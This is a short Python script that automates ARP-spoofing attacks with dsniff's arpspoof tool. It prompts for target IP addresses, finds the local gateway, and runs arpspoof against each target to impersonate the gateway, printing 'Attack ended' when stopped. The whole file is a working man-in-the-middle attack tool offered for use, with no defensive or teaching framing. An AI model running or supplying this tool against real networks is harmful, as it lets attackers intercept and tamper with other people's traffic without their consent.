# NOTE: you need to in stall dsniff (apt install dsniff)

import subprocess
import re
try:
        # Get user input for target public IP addresses (comma-separated)
        target_ips_input = input("Enter the target public IP addresses (comma-separated): ")
        print("\n")
        target_ips = [ip.strip() for ip in target_ips_input.split(',')]

        # Get the host IP address
        proc = subprocess.Popen(["hostname", "-I"], stdout=subprocess.PIPE)
        host_ip = proc.stdout.read().decode("utf-8").split()[0]

        # Calculate the default gateway IP address
        proc = subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE)
        output = proc.stdout.read().decode("utf-8")
        default_gateway_ip = re.search(r"default via ([\d.]+)", output).group(1)

        # Iterate through each target IP
        for target_ip in target_ips:
                # Check if the target IP is the default gateway or the host IP
                if target_ip == default_gateway_ip:
                        print(f"ERROR: Target IP {target_ip} is the default gateway.")
                elif target_ip == host_ip:
                        print(f"ERROR: Target IP {target_ip} is the host IP.")
                else:
                        # Build the arpspoof command with the obtained IP addresses
                        arpspoof_cmd = ["arpspoof", "-i", "eth0", "-t", target_ip, default_gateway_ip]

                        # Run the arpspoof command using subprocess
                        subprocess.call(arpspoof_cmd)

except KeyboardInterrupt as e:
        print("\nAttack ended")
